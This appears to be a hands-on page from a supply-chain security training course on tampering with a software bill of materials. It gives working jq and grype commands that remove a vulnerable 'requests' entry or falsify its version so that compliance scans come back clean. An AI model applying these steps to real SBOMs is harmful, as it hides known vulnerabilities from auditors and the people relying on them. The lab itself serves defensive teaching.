# Lab 4.7: SBOM Tampering

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Remove a Vulnerable Component and Pass Compliance

### Step 1: Identify the target component

```bash
grype sbom:/app/sbom-original.json --output json | jq -r '
  .matches[]
  | select(.vulnerability.severity == "Critical")
  | "\(.artifact.name) \(.artifact.version) - \(.vulnerability.id)"
' | head -5
```

### Step 2: Create the tampered SBOM

```bash
cat /app/sbom-original.json | jq '
  .components = [.components[] | select(.name != "requests")]
' > /app/sbom-tampered.json

echo "Original components: $(jq '.components | length' /app/sbom-original.json)"
echo "Tampered components: $(jq '.components | length' /app/sbom-tampered.json)"
```

One line of `jq`.

### Step 3: Run the compliance check on the tampered SBOM

```bash
echo "=== Original SBOM ==="
grype sbom:/app/sbom-original.json --output table --only-fixed 2>&1 | head -20

echo "=== Tampered SBOM ==="
grype sbom:/app/sbom-tampered.json --output table --only-fixed 2>&1 | head -20
```

The tampered SBOM produces a clean compliance report. The vulnerability still exists in the actual artifact.

### Step 4: Version number tampering

Removal is obvious if someone compares component counts. A subtler attack:

```bash
cat /app/sbom-original.json | jq '
  .components = [.components[] |
    if .name == "requests" and .version == "2.25.0"
    then .version = "2.31.0" | .purl = (.purl | gsub("2.25.0"; "2.31.0"))
    else .
    end
  ]
' > /app/sbom-version-tampered.json

grype sbom:/app/sbom-version-tampered.json --output table 2>&1 | grep -i requests || echo "No findings for requests"
```

Same component count, but the CVE no longer matches. The actual deployed artifact still runs `requests==2.25.0`.

> **Checkpoint:** You should have `sbom-original.json`, `sbom-tampered.json`, and `sbom-version-tampered.json`. Run grype against all three and confirm the original flags the CVE while the tampered versions don't.
